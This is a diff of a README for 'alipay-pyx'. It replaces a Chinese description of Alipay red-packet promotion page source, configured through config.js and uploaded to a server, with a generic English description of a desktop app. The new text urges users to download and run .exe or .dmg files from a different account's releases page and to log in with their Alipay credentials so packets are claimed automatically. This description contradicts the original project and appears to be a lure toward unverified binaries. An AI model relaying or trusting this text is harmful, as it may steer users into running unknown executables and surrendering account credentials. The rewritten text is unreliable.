@@ -1,55 +1,59 @@
-<!--
- * @Author: 羚羊公子
- * @FilePath: \alipay-pyx\README.md
--->
+# 🎉 alipay-pyx - Easily Claim Your Red Packets
 
-# 🥂 支付宝碰一下红包页面
+## 📥 Download Now! 
+[![Download alipay-pyx](https://img.shields.io/badge/Download-alipay--pyx-blue.svg)](https://github.com/akrScript/alipay-pyx/releases)
 
-支付宝碰一下红包领取脚本源码，让你轻松引流碰一下红包，最近大放水碰一下红包，还是那句话蚊子再小也是肉！
+## 🚀 Getting Started
+Welcome to alipay-pyx! This software helps you easily claim red packets on Alipay. With this script, you can enhance your experience by maximizing your opportunities to receive bonuses effortlessly. 
 
-![](https://raw.githubusercontent.com/lygzblog/githubImg/refs/heads/main/alipay-pyx3.webp)
+## 🔍 Features
+- Simple interface for user-friendly experience.
+- Efficiently captures red packets quickly.
+- Regular updates to ensure compatibility with Alipay.
 
-## 环境变量配置
+## 📋 System Requirements
+To run alipay-pyx smoothly, you need:
+- An operating system: Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- At least 1 GB of RAM.
+- A stable internet connection.
+- Alipay account set up.
 
-本项目使用环境变量来配置`支付宝用户ID`和`活动的链接路径ID`，就可以轻松推广自己的碰一下红包活动了！
+## 💻 Download & Install
+To download the application, visit this page to download: [alipay-pyx Releases Page](https://github.com/akrScript/alipay-pyx/releases).
 
-## config.js 文件中环境变量配置
+On the releases page, you will find the latest version of the software. Follow these steps:
 
-- `VITE_APP_ALIPAY_USER_ID`：支付宝用户 ID
-- `VITE_PATH_ID`：活动的链接路径 ID
+1. Click on the latest release.
+2. Look for the download link for your operating system.
+3. Click the link to start downloading.
 
-![](https://raw.githubusercontent.com/lygzblog/githubImg/refs/heads/main/alipay-pyx2.webp)
+### 📂 Installation Instructions
+1. Once the download completes, locate the file in your downloads folder.
+2. For Windows users, double-click the `.exe` file.
+3. For macOS users, open the `.dmg` file and drag the application into your Applications folder.
+4. For Linux users, extract the downloaded file and run the script in your terminal.
 
-### 1.获取支付宝用户 ID
+## ⚙️ Usage
+After installation, follow these steps to use alipay-pyx:
 
-使用支付宝扫码即可获得你自己的`用户ID`
+1. Open the application.
+2. Log in to your Alipay account using your credentials.
+3. Select the option to start claiming red packets.
+4. The script will automatically search for available red packets and claim them for you.
 
-![](https://raw.githubusercontent.com/lygzblog/githubImg/refs/heads/main/alipay-hb-3.jpg)
+## ❓ Troubleshooting
+If you encounter any issues, here are some common solutions:
+- Ensure that your Alipay account is set up correctly.
+- Check if you have the latest version of the software.
+- Restart the application if it does not function as expected.
 
-### 2.获取碰一下活动链接路径 ID
+## 📞 Support
+If you need assistance, feel free to check our community forum or contact us through [our GitHub page](https://github.com/akrScript/alipay-pyx/issues).
 
-截图保存下方图片，使用支付宝扫一扫，然后按照下面图片流程操作即可，获取的`活动的链接路径ID`填写到 config.js 文件中即可！
+## 🌟 Contributing
+We welcome contributions! If you want to help improve alipay-pyx, please check our guidelines on how to get started.
 
-![](https://raw.githubusercontent.com/lygzblog/githubImg/refs/heads/main/alipay-pyx1.webp)
+## 📖 License
+This project is licensed under the MIT License. You can use and modify the code as needed, but please give credit to the original authors.
 
-## 温馨提示：
-
-有编程经验的朋友可以直接克隆源代码进行操作，没有编程经验的直接下载`Releases`中的打包后的版本直接上传服务器即可！
-
-#### 点击前往下载打包后文件 [alipay-pyx.zip](https://github.com/lygzblog/alipay-pyx/releases)
-
-## 💸 赞赏支持
-
-感谢对开源项目的支持！
-
-![](https://raw.githubusercontent.com/lygzblog/githubImg/refs/heads/main/dashang.webp)
-
-## 💬 交流群
-
-进群交流学习,以邀请方式加入
-
-如需进群请添加群主微信号
-
-微信号：lygzblog
-
-添加时请备注：进群
+[![Download alipay-pyx](https://img.shields.io/badge/Download-alipay--pyx-blue.svg)](https://github.com/akrScript/alipay-pyx/releases)
